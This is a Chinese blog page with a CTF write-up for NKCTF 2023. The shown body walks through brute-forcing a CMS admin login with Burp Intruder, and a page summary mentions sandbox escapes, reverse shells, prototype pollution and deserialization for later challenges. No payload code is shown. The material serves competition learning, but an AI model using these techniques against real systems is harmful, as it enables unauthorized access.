<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>2023-NKCTF-wp | VV</title><meta name="keywords" content="wp"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="2023-NKCTF-wp"><meta name="application-name" content="2023-NKCTF-wp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="2023-NKCTF-wp"><meta property="og:url" content="http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="NKCTF WP WEB结果比赛结束 排名：48   也算是造神成功吧 我们队：  还是可以 爆了1道web 2道misc 1道re 1道pwn 我会做的就3道 现在先复现一下web方向的题吧  my first cmscms弱密码爆破+命令执行 这道是唯一写出来的web题 进来时一些页面 有新闻"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="NKCTF WP WEB结果比赛结束 排名：48   也算是造神成功吧 我们队：  还是可以 爆了1道web 2道misc 1道re 1道pwn 我会做的就3道 现在先复现一下web方向的题吧  my first cmscms弱密码爆破+命令执行 这道是唯一写出来的web题 进来时一些页面 有新闻"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: '2023-NKCTF-wp',
  postAI: '',
  pageFillDescription: 'NKCTF WP WEB, 结果, my first cms, 全世界最简单的CTF, 法1, 法2, 法3, attack_tacoooooooo, 用过就是熟悉结果比赛结束排名也算是造神成功吧我们队还是可以爆了道道道道我会做的就道现在先复现一下方向的题吧弱密码爆破命令执行这道是唯一写出来的题进来时一些页面有新闻下载等其实在最开始发现在上有一些东西可以通过数字改变来改变页面状态然后尝试注入无果然后在首页发现登录连接点击后有登录页面的弱密码爆破先猜是抓包发给标爆破目标传字典开始用了一个的字典没爆破出来找到重定向所以密码就是登录进入后台有文件上传系统可以通过写马进行后门连接可以直接命令执行要两次可以执行一次命令发现文件直接全世界最简单的进来后只有一个这个界面只能执行代码扫一下发现泄露访问交给后发现是沙箱逃逸我也是卡在这里有随便在网上找了个来打但是过滤了几乎所以绕过至少在比赛的这两天我们尝试了网上能找到的几乎所以绕过方式也没法绕过我们也是卡在这里没有解决至此有三种方式可以继续向下完成这道题法继续绕过果然还有我们没想到的绕过方法可以继续不允许出现我们有两种方法绕过一种是绕过第二种我们可以发现他正则匹配没有也就是对大小写不敏感我们可以通过里面的绕过接下来我们看最难的绕过这个东西不是字符串而是方法所以我们并不能像之前两种方式绕过我们选择方法绕过的命令执行绕过文章在中需要使用这个关键字来实现反射调用函数的方式譬如要得到函数可以首先通过拿到所有函数然后即可得到返回所有函数拿到拿到之后就可以常规思路了这里虽然有可能被检测到的关键字但由于等关键字都在字符串里可以利用上面提到的方法编码譬如进制这里还有个小如果过滤了关键字可以用来搜索函数也可以用来搜索过滤中括号的情况在中获取到的方式是通过数组其中用到了中括号假如中括号被过滤可以用来绕的作用是获取对象身上某个属性的值类似于所以取函数的方式可以变成后面拼接上命令执行的即可所以根据你提供的对象的键获取到对应的值是不是和数组的索引有点像呢我们用他来绕过反弹拿注一定要是公网的监听不到直接法漏洞加了一点限制没有指针但是因为有可以抛出异常来逃逸如下一样的思路但是是反弹也是直接读环境问题此方法没有弹出但正常情况下一定能出法根据源码可以看出是一个逃逸但是过于强大导致没法逃逸执行命令只能另辟蹊径可以发现中对有一个判断正常情况下是没有这个属性的猜测这里可以原型链污染从而任意读取文件回过来看逃逸这里可以获取到沙盒外的一个对象所以我们这里可以进行污染如这样就污染了的属性因为找不到这个属性就会到里去找最终在找到这个属性观察源码可以发现污染为访问读取到的内容为继续读取这里很明显也能进行污染控制问题是怎么漏洞点在打断点进入方法调试可以发现里面可以通过原型链污染控制某些属性的值可以达到任意文件包含的效果调试过程可以参考我们构造包含就可以了也是反弹同样读即可这道题也是有思路吧题目描述进入容器开始时也是发现上有参数尝试无果回头看题目描述得到账号然后就产生爆破密码的字典没有爆出感觉应该不是这样写的抓包传密码回显密码不对然后我发现容器叫所以尝试密码为回显到这里我感觉其实密码就是结合抓包结果中有传参有再结合研究这道题后查找出资料发现这道题可能是的漏洞复现也有极有可能是最后发现其实跟反序列化有关再结合我输入的回显至此我认为我的思路清晰了通过反序列化将覆盖然后登录进入但是我根本不知道要将覆盖成什么卡死在这里看完后发现其实可以直接登录进入密码是怎么说呢回显误我进入然后呢请看此文章屏蔽器会话处理中的路径遍历会导致不安全的反序列化和远程代码执行反正我在国内没找到有用的的文章所以与反序列化的思路是没问题的根据文章复现漏洞即可文件生成创建两个序列化对象一个用于一个用于它们将在反序列化时执行请求所以要稍微改一下生成文件的脚本根据上文接下来就是上传文件然后改和替换将值更改为替换为当前登录用户的电子邮件然后替换为并且我们的路径是绝对路径而不是相对的所以现在我们需要找到一个可以上传文件的地方最后在这里面找到文件上传系统运行其实是生成一段反序列化后的代码这里是没加的记得要加和端口所以直接来也是一样的上传文件然后随便抓包改再反弹即可用过就是熟悉这个是完全没思路审了半天源码其实感觉是反序列化但是代码太多了没找到链子反序列化题目进来是个登录界面给了源码简单看下源码其实就能发现有一些魔术方法这也是我为什么猜测有反序列化漏洞的原因所以直接搜中有这个还有提示不出意外的话就是这个了保险起见继续找下差不多了其实就是第三个给了所以是反序列化且这里是是链子的开头接下来就是用一样的方法找方法和只有三个根据代码第一个是链子的可能新最高流量只有两个并且这两个都没什么用所以第一个应该有链子查找资料后发现和很像根据文章继续跟进跟进为关闭文件的方法没有利用点跟进此处对进行了赋值其中包含字段是可控的所以可以触发魔术方法根本没想到这里又是一处思维误区习惯性的在中找没有最后在中找到这里可以继续跟进太难找了在里面的话为什么我最开始没找到一样在继续跟进这里的也是可控的所以可以触发魔术方法访问不存在的属性而在上文提到的文章中发现他的很长追加关联对象属性追加关联对象属性这里其实是在触发方法所以我们这里也要想办法触发方法找到参数也是可控的接着我们就能调用方法但是其实是有两个方法如下这个可以包含文件这个可以写文件第二个我们的写进去的内容来自于我们跟进说明我们的里面有提示所以我们的思路就是首先走写文件的然后读直接放了触发子类合适注意生成文件名的逻辑所以我们可以根据本地预测时间的方式执行然后执行这个脚本后马上重复发包生成的包连发六秒保险起见也可以多发几秒这样总有一个是我们的生成的文件名其实可以直接写时间竞争上传脚本遍历列表中的每个数字下载到也可以直接爆破文件名可道亲爱的我怀着一颗激动而充满温柔的心写下这封情书希望它能够传达我对你的深深情感或许这只是一封文字但我希望每一个字都能如我心情般真挚在这个瞬息万变的世界里你是我生命中最美丽的恒定每一天我都被你那灿烂的笑容和温暖的眼神所吸引仿佛整个世界都因为有了你而变得更加美好你的存在如同清晨第一缕阳光温暖而宁静或许我们之间存在一种特殊的联系一种只有我们两个能够理解的默契我曾听说密码的明文加上心爱之人的名字就能够听到游客的心声而我想告诉你你就是我心中的那个游客每一个与你相处的瞬间都如同解开心灵密码的过程让我更加深刻地感受到你的独特魅力你的每一个微笑都是我心中最美丽的音符你的每一句关心都是我灵魂深处最温暖的拥抱在这个喧嚣的世界中你是我安静的港湾是我倚靠的依托我珍视着与你分享的每一个瞬间每一段回忆都如同一颗珍珠串联成我生命中最美丽的项链或许这封情书只是文字的表达但我愿意将它寄予你如同我内心深处对你的深深情感希望你能感受到我的真挚就如同我每一刻都在努力解读心灵密码一般愿我们的故事能够继续在这段感情的旅程中我们共同书写属于我们的美好篇章新建文件通过这个请求包可以对进行解密注意看一下你知道吗发现跟踪解密写解密脚本字符串加解密类一次一密且定时解密有效可用于加密动态生成加密解密字符加解密一次一密可定时解密有效原文或者密文操作密钥密文有效期单位为永久有效处理后的原文或者经过处理后的密文解密密匙做数据完整性验证用于变化生成的密文初始化向量打乱密匙簿增加随机性加解密从密匙簿得出密匙进行异或再转成字符字符加解密一次一密可定时解密有效原文或者密文操作密钥密文有效期单位为永久有效处理后的原文或者经过处理后的密文解密密匙做数据完整性验证用于变化生成的密文初始化向量打乱密匙簿增加随机性加解密从密匙簿得出密匙进行异或再转成字符解密出密码为其实文件里面也有登录进入回收站中找到还原还给了路径尝试访问该路由发现确实存在该文件结合之前的文件包含的直接包含触发子类合适发包后面是一个无回显执行命令好像没有或用外带成功直接读结束最后一道题太抽象了',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-15 10:29:09',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">19</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/wp/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>wp</span></a></span></div></div><h1 class="post-title" itemprop="name headline">2023-NKCTF-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-15T02:29:09.616Z" title="更新于 2024-05-15 10:29:09">2024-05-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>28分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="2023-NKCTF-wp"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/"><header><a class="post-meta-categories" href="/categories/Writeup/" itemprop="url">Writeup</a><a href="/tags/wp/" tabindex="-1" itemprop="url">wp</a><h1 id="CrawlerTitle" itemprop="name headline">2023-NKCTF-wp</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time><time itemprop="dateCreated datePublished" datetime="2024-05-15T02:29:09.616Z" title="更新于 2024-05-15 10:29:09">2024-05-15</time></header><h1 id="NKCTF-WP-WEB"><a href="#NKCTF-WP-WEB" class="headerlink" title="NKCTF WP WEB"></a>NKCTF WP WEB</h1><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>比赛结束 排名：48 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db55e044.png" alt="image-20240325194057570"></p>
<p>也算是造神成功吧</p>
<p>我们队：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db85dd3b.png" alt="image-20240325214319739"></p>
<p>还是可以</p>
<p>爆了1道web 2道misc 1道re 1道pwn</p>
<p>我会做的就3道 现在先复现一下web方向的题吧</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db4e7021.png" alt="image-20240325194620606"></p>
<h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>cms弱密码爆破+命令执行</p>
<p>这道是唯一写出来的web题</p>
<p>进来时一些页面 有新闻 下载等</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db4de776.png" alt="image-20240325194732447"></p>
<p>其实在最开始发现在url上有一些东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db584f13.png" alt="image-20240325194837561"></p>
<p>page可以通过数字改变来改变页面状态</p>
<p>然后尝试sql注入 无果</p>
<p>然后在首页发现登录连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db545569.png" alt="image-20240325195032700"></p>
<p>click here to login</p>
<p>点击后有登录页面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db508e50.png" alt="image-20240325195118920"></p>
<p>cms的弱密码爆破</p>
<p>先猜user name 是admin</p>
<p>抓包：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db5c57d6.png" alt="image-20240325195529321"></p>
<p>发给intruder</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db71259c.png" alt="image-20240325195811599"></p>
<p>标爆破目标</p>
<p>传字典</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db6c7b45.png" alt="image-20240325195844012"></p>
<p>开始用了一个5000的字典没爆破出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db644131.png" alt="image-20240325200015594"></p>
<p>找到302重定向</p>
<p>所以密码就是Admin123</p>
<p>登录 进入后台</p>
